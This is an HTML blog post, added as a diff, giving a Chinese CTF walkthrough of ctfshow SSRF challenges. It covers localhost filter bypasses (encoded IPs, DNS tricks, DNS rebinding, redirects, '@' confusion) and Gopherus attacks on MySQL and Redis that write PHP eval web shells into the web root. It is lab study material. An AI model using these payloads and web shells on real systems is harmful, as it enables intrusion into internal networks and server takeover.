@@ -1,0 +1,196 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ssrf | 向每个梦想加速</title><meta name="author" content="向每个梦想加速"><meta name="copyright" content="向每个梦想加速"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ssrf漏洞介绍 我们可以通过外网连到服务器。服务器可以访问内部网络。 我们可以通过外网以服务器为媒介访问内部网络。 parse_url() 是 PHP 中的一个内置函数，用于解析一个 URL 并将其分解为各个组成部分，例如协议（scheme）、主机名（host）、端口（port）、路径（path）、查询字符串（query）和锚点（fragment）等。 parse_url()  12345678">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssrf">
+<meta property="og:url" content="http://example.com/2025/03/05/ssrf/index.html">
+<meta property="og:site_name" content="向每个梦想加速">
+<meta property="og:description" content="ssrf漏洞介绍 我们可以通过外网连到服务器。服务器可以访问内部网络。 我们可以通过外网以服务器为媒介访问内部网络。 parse_url() 是 PHP 中的一个内置函数，用于解析一个 URL 并将其分解为各个组成部分，例如协议（scheme）、主机名（host）、端口（port）、路径（path）、查询字符串（query）和锚点（fragment）等。 parse_url()  12345678">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/touxiang.png">
+<meta property="article:published_time" content="2025-03-05T12:31:18.000Z">
+<meta property="article:modified_time" content="2025-03-05T12:32:12.128Z">
+<meta property="article:author" content="向每个梦想加速">
+<meta property="article:tag" content="ssrf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/touxiang.png"><link rel="shortcut icon" href="/img/urltouxiang.png"><link rel="canonical" href="http://example.com/2025/03/05/ssrf/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ssrf',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/beijing.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">向每个梦想加速</span></a><a class="nav-page-title" href="/"><span class="site-name">ssrf</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ssrf</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-05T12:31:18.000Z" title="发表于 2025-03-05 20:31:18">2025-03-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-05T12:32:12.128Z" title="更新于 2025-03-05 20:32:12">2025-03-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1>ssrf漏洞介绍</h1>
+<p>我们可以通过外网连到服务器。服务器可以访问内部网络。</p>
+<p>我们可以通过外网以服务器为媒介访问内部网络。</p>
+<p><code>parse_url()</code> 是 PHP 中的一个内置函数，用于解析一个 URL 并将其分解为各个组成部分，例如协议（scheme）、主机名（host）、端口（port）、路径（path）、查询字符串（query）和锚点（fragment）等。</p>
+<h1>parse_url()</h1>
+<p><img src="image-20250304195640159.png" alt="image-20250304195640159"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">						 <span class="title function_ invoke__">parse_url</span>()  </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname			//</span><br><span class="line">    [user] =&gt; username			@前</span><br><span class="line">    [pass] =&gt; password			@前</span><br><span class="line">    [path] =&gt; /path				/</span><br><span class="line">    [query] =&gt; arg=value		?以后的key=value</span><br><span class="line">    [fragment] =&gt; anchor		#以后的部分</span><br><span class="line">)</span><br><span class="line">	/path</span><br></pre></td></tr></table></figure>
+<p><code>@</code> 的作用</p>
+<p>在 URL 中，<code>@</code> 的作用是明确地将用户名和密码与主机名区分开。它的语法格式为：</p>
+<p>用户名:密码@主机名</p>
+<h1>web351</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=127.0.0.1/flag.php</span><br><span class="line">url=file://var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+<h1>web352</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">十六进制</span><br><span class="line">  url=http:<span class="comment">//0x7F.0.0.1/flag.php</span></span><br><span class="line"></span><br><span class="line">八进制</span><br><span class="line">  url=http:<span class="comment">//0177.0.0.1/flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span> 进制整数格式</span><br><span class="line">  url=http:<span class="comment">//2130706433/flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="number">0</span>x</span><br><span class="line">  url=http:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line"></span><br><span class="line">还有一种特殊的省略模式</span><br><span class="line">  <span class="number">127.0</span>.<span class="number">0.1</span>写成<span class="number">127.1</span></span><br><span class="line"></span><br><span class="line">用CIDR绕过localhost</span><br><span class="line">  url=http:<span class="comment">//127.127.127.127/flag.php</span></span><br><span class="line"></span><br><span class="line">还有很多方式</span><br><span class="line">  url=http:<span class="comment">//0/flag.php</span></span><br><span class="line">  url=http:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1>web353</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br><span class="line">url=http:<span class="comment">//127.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0x7f.0.0.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0177.0.0.1/flag.php</span></span><br></pre></td></tr></table></figure>
+<h1>web354</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">奇淫巧技：将域名A类指向<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="title function_ invoke__">http</span>(s):<span class="comment">//sudo.cc/指向127.0.0.1</span></span><br><span class="line"></span><br><span class="line">url=http:<span class="comment">//sudo.cc/flag.php</span></span><br><span class="line"></span><br><span class="line">也可以跳转到一个自己搭建的网站，再通过自己网站的自动跳转</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="comment"># POST: url=http://your-domain/ssrf.php</span></span><br></pre></td></tr></table></figure>
+<h1>web355</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br><span class="line"><span class="number">127.1</span></span><br></pre></td></tr></table></figure>
+<h1>web356</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br></pre></td></tr></table></figure>
+<h1>web357</h1>
+<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">DNS重绑定</a></p>
+<p><img src="image-20250304203200017.png" alt="image-20250304203200017"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//7f000001.01010117.rbndr.us/flag.php</span></span><br></pre></td></tr></table></figure>
+<h1>web358</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//ctf.@127.0.0.1/flag.php?show</span></span><br></pre></td></tr></table></figure>
+<h1>web359</h1>
+<p>这题用到Gopher，链接如下(必看)</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_57172130/article/details/126169480">SSRF利用协议中的万金油——Gopher</a></p>
+<p>Gopher介绍</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Gopher协议及其应用</span><br><span class="line">【网络安全 | HTTP】 gopher协议原理、语法及利用总结-CSDN …</span><br><span class="line">https://blog.csdn.net/2301_77485708/article/details/132052102</span><br><span class="line">gopher协议的利用 - FreeBuf网络安全行业门户</span><br><span class="line">https://www.freebuf.com/articles/web/337824.html</span><br><span class="line">SSRF利用协议中的万金油——Gopher_dict协议-CSDN博客</span><br><span class="line">https://blog.csdn.net/qq_50854662/article/details/129180268</span><br><span class="line"></span><br><span class="line">Gopher协议是一种早期的互联网协议，主要用于在网络上获取文本信息。它在1991年提出，设计目的是提供一种简单且高效的方式来浏览和访问文件。Gopher协议通过类似文件系统的层次结构来组织数据，每个项目都有一个唯一的标识符。用户可以通过Gopher客户端软件浏览目录，选择下载或查看文件。Gopher服务器能够提供文本文件、图像文件、二进制文件等多种类型的文件。</span><br><span class="line"></span><br><span class="line">与HTTP相比，Gopher协议具有更简单的设计和较少的功能，它基于传输控制协议（TCP）进行通信，默认端口号为70。然而，随着万维网的崛起和HTTP的普及，Gopher协议逐渐被取代。</span><br><span class="line"></span><br><span class="line">Gopher协议的利用</span><br><span class="line"></span><br><span class="line">Gopher协议可以被用来攻击内网的Redis、Mysql、FastCGI、Ftp等服务，也可以发送GET、POST请求，这样可以拓宽SSRF（服务器端请求伪造）的攻击面。例如，当SSRF无法通过HTTP协议传递POST数据时，可以使用Gopher协议来发起POST请求。</span><br><span class="line"></span><br><span class="line">Gopher协议的语法</span><br><span class="line"></span><br><span class="line">Gopher协议的格式通常为：</span><br><span class="line"></span><br><span class="line">gopher://hostname:port/请求方法(get、post等)/path</span><br><span class="line">其中，hostname表示Gopher服务器的主机名或IP地址，port表示Gopher服务器监听的端口号（默认为70），path则是资源的路径。例如，要请求Gopher服务器上的/example/file.txt文本文件，可以使用上述格式的URL。</span><br><span class="line"></span><br><span class="line">Gopher协议在SSRF攻击中的应用</span><br><span class="line"></span><br><span class="line">在SSRF攻击场景中，利用Gopher协议可以实现多个数据包的整合发送。这种方法可以用于攻击内网的FTP、Telnet、Redis、Memcache等服务。Gopher协议的强大之处在于它可以通过构造特定的请求，来执行对内网服务的攻击，例如写入定时任务或SSH公钥，甚至是执行SQL语句来写入Webshell。</span><br><span class="line">Gopher协议在各个编程语言中的支持情况不同，例如PHP需要--with-curlwrappers且版本至少为5.3，Java版本小于JDK1.7，而Curl的低版本不支持Gopher协议</span><br><span class="line"></span><br><span class="line">结论</span><br><span class="line"></span><br><span class="line">Gopher协议虽然在现代互联网中已不常用，但在网络安全领域，它仍然是一个强大的工具。它的简单性和灵活性使得它在特定的攻击场景中非常有用，尤其是在SSRF攻击中扩展攻击面。因此，了解Gopher协议的工作原理和应用方式对于网络安全防范至关重要</span><br></pre></td></tr></table></figure>
+<p>根据我的理解，gopher可以写入文件。</p>
+<p>进去之后是一个登录界面，sql没有用、弱口令也没有用，抓包之后发现有一个returl=…，修改也没有用。</p>
+<p>wp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载gopher</span><br><span class="line">git clone https://github.com/tarunkant/Gopherus.git</span><br><span class="line">cd Gopherus</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit mysql</span><br><span class="line"></span><br><span class="line">username:root</span><br><span class="line">写入一句话木马</span><br><span class="line">select &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &#x27;/var/www/html/2.php&#x27;;</span><br></pre></td></tr></table></figure>
+<p>之后可以访问2.php然后getshell，最终拿flag</p>
+<h1>web360</h1>
+<p>和上面差不多</p>
+<p>差别：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit redis</span><br><span class="line">PHPShell</span><br><span class="line">ctfshow</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">向每个梦想加速</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/05/ssrf/">http://example.com/2025/03/05/ssrf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">向每个梦想加速</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ssrf/">ssrf</a></div><div class="post-share"><div class="social-share" data-image="/img/touxiang.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/03/05/phpCVE/" title="phpCVE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">phpCVE</div></div><div class="info-2"><div class="info-item-1">web311 不知道是什么东西，跟着wp做就莫名其妙拿到shell了 CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。 向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常。 该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下： 12345678910111213location ~ [^/]\.php(/|$) &#123; ... fastcgi_split_path_info ^(.+?\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass   php:9000; ...&#125; 攻击者可以使用换行符（％0a）来破坏fastcgi_split_path_info指令中的Regexp。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。 影响范围 在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下...</div></div></div></a><a class="pagination-related" href="/2025/02/05/php%E7%89%B9%E6%80%A7/" title="php特性"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">php特性</div></div><div class="info-2"><div class="info-item-1">intval函数，虽然这里是这一个函数，但这里的绕过知识可以类比其他函数 intval() 函数可以获取变量的「整数值」，常用于强制类型转换。 语法 1int intval( $var, $base ) 参数  $var：需要转换成 integer 的「变量」 $base：转换所使用的「进制」  返回值 返回值为 integer 类型，可能是 0 或 1 或 其他integer 值。  0：失败 或 空array 返回 0 1：非空array 返回 1 其他integer值：成功时 返回 $var 的 integer 值。  返回值的「最大值」取决于系统  32 位系统（-2147483648 到 2147483647） 64 位系统（-9223372036854775808到9223372036854775807）  一、进制自动转换 第二个参数 $base 允许为空。 当 base 为空时，默认值是 0，会根据 $var 的格式来调整转换的进制。  如果 $var 以 0 开头，就使用 8进制 如果 $var 以0x开头，就使用 16进制 否则，就使用...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">向每个梦想加速</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://user.qzone.qq.com/2325525993"><i class="fas fa-envelope"></i><span>qq空间</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">qq2325525993</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">ssrf漏洞介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">parse_url()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">web351</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">web352</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">web353</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">web354</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">web355</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">web356</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">web357</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">web358</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">11.</span> <span class="toc-text">web359</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">12.</span> <span class="toc-text">web360</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/05/phpCVE/" title="phpCVE">phpCVE</a><time datetime="2025-03-05T12:59:07.000Z" title="发表于 2025-03-05 20:59:07">2025-03-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/05/ssrf/" title="ssrf">ssrf</a><time datetime="2025-03-05T12:31:18.000Z" title="发表于 2025-03-05 20:31:18">2025-03-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/05/php%E7%89%B9%E6%80%A7/" title="php特性">php特性</a><time datetime="2025-02-05T14:23:37.000Z" title="发表于 2025-02-05 22:23:37">2025-02-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">文件上传</a><time datetime="2025-02-05T14:21:58.000Z" title="发表于 2025-02-05 22:21:58">2025-02-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/05/sql%E6%B3%A8%E5%85%A5/" title="sql注入">sql注入</a><time datetime="2025-02-05T14:18:28.000Z" title="发表于 2025-02-05 22:18:28">2025-02-05</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/beijing.png);"><div id="footer-wrap"><div class="copyright">&copy;2025 By 向每个梦想加速</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
